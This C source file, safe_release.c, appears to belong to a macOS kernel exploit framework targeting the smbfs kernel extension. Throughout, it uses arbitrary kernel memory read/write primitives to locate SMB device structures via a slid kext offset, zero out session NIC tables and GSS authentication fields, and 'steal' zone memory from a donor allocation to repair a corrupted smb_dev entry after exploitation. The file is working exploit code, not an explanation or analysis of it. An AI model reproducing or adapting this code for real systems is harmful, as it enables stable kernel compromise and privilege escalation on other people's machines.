//
//  safe_release.c
//  xpl_kmem
//
//  Created by sreejith on 3/22/22.
//

#include <sys/stat.h>

#include <xpl/util/assert.h>
#include <xpl/slider/kext.h>
#include <xpl/memory/kmem.h>

#include <smbfs/kext.h>
#include <smbfs/smb_dev.h>

#include "safe_release.h"
#include "../smb/params.h"
#include "../smb/nic_allocator.h"


int xpl_safe_release_fd_to_dtab_idx(int fd) {
    struct stat dev_stat;
    int res = fstat(fd, &dev_stat);
    xpl_assert_errno(res);
    dev_t dev = dev_stat.st_rdev;
    int idx = minor(dev);
    return idx;
}


uintptr_t xpl_safe_release_fd_to_dev(int fd, xpl_slider_kext_t slider) {
    uintptr_t smb_dtab = xpl_slider_kext_slide(slider, XPL_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
    return xpl_kmem_read_ptr(smb_dtab, xpl_safe_release_fd_to_dtab_idx(fd) * sizeof(uintptr_t));
}


void xpl_safe_release_reset_client_nics(int fd, xpl_slider_kext_t smbfs_slider) {
    uintptr_t dev = xpl_safe_release_fd_to_dev(fd, smbfs_slider);
    uintptr_t session = xpl_kmem_read_ptr(dev, offsetof(struct smb_dev, sd_session));
    uintptr_t table = session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET;
    xpl_kmem_write_uint32(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET, 0);
    xpl_kmem_write_uint64(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET, 0);
    xpl_kmem_write_uint64(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET + 8, table + TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET);
}


void xpl_safe_release_reset_auth_info(int fd, xpl_slider_kext_t smbfs_slider) {
    uintptr_t dev = xpl_safe_release_fd_to_dev(fd, smbfs_slider);
    uintptr_t session = xpl_kmem_read_ptr(dev, offsetof(struct smb_dev, sd_session));
    uintptr_t iod = xpl_kmem_read_ptr(session, TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET);
    xpl_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_spn), 0);
    xpl_kmem_write_uint64(iod, offsetof(struct smbiod, iod_gss.gss_cpn), 0);
    xpl_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_spn_len), 0);
    xpl_kmem_write_uint32(iod, offsetof(struct smbiod, iod_gss.gss_cpn_len), 0);
}


void xpl_safe_release_restore_smb_dev(const struct sockaddr_in* addr, int fd, const struct smb_dev* backup, _Bool valid_mem, xpl_slider_kext_t slider) {
    if (valid_mem) {
        /// We have valid memory allocated to smb device, just restore the contents
        uintptr_t dev = xpl_safe_release_fd_to_dev(fd, slider);
        xpl_kmem_write(dev, 0, backup, sizeof(*backup));
    } else {
        /// No valid memory, we have to find one from default.48 zone
        smb_nic_allocator allocator = smb_nic_allocator_create(addr, sizeof(*addr));
        
        /// Associate a socket address with length sizeof(struct smb_dev). The memory for
        /// this socket address will be allocated from default.48 zone
        struct network_nic_info info;
        bzero(&info, sizeof(info));
        info.addr_4.sin_len = sizeof(*backup);
        info.addr_4.sin_family = AF_INET;
        
        int error = smb_nic_allocator_allocate(allocator, &info, 1, sizeof(info));
        xpl_assert_err(error);
        
        uintptr_t donor_dev = xpl_safe_release_fd_to_dev(allocator, slider);
        uintptr_t session = xpl_kmem_read_ptr(donor_dev, offsetof(struct smb_dev, sd_session));
        uintptr_t table = session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET;
        uintptr_t nic = xpl_kmem_read_ptr(table, TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET);
        uintptr_t entry = xpl_kmem_read_ptr(nic, offsetof(struct complete_nic_info_entry, addr_list));
        uintptr_t addr = xpl_kmem_read_ptr(entry, offsetof(struct sock_addr_entry, addr));
        xpl_assert_kaddr(addr);
        
        /// Steal the memory from `addr`
        xpl_kmem_write_uint64(entry, offsetof(struct sock_addr_entry, addr), 0);
        smb_nic_allocator_destroy(&allocator);
        
        /// Associate the stolen memory to smb device
        xpl_kmem_write(addr, 0, backup, sizeof(*backup));
        int dtab_idx = xpl_safe_release_fd_to_dtab_idx(fd);
        uintptr_t dtab = xpl_slider_kext_slide(slider, XPL_KEXT_SEGMENT_DATA, KEXT_SMBFS_VAR_SMB_DTAB_DATA_OFFSET);
        xpl_kmem_write_uint64(dtab, dtab_idx * sizeof(uintptr_t), addr);
    }
}
